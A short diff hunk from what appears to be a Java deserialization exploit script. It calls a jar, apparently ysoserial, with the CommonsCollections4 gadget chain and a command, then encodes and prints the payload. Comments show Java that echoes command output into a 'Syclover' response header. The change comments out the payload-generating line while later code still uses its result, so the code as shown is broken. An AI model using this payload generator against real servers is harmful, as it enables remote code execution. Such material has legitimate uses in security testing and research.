@@ -76,7 +76,7 @@ if __name__ == '__main__':
     # while ((a = in.read(b)) != -1) {baos.write(b, 0, a);}
     # responseFacade.setHeader("Syclover",new String(b));'''
     
-    popen = subprocess.Popen(['java', '-jar', JAR_FILE, 'CommonsCollections4', command],stdout=subprocess.PIPE)
+    #popen = subprocess.Popen(['java', '-jar', JAR_FILE, 'CommonsCollections4', command],stdout=subprocess.PIPE)
     
     payload = encode(popen.stdout.read())
     print(payload)
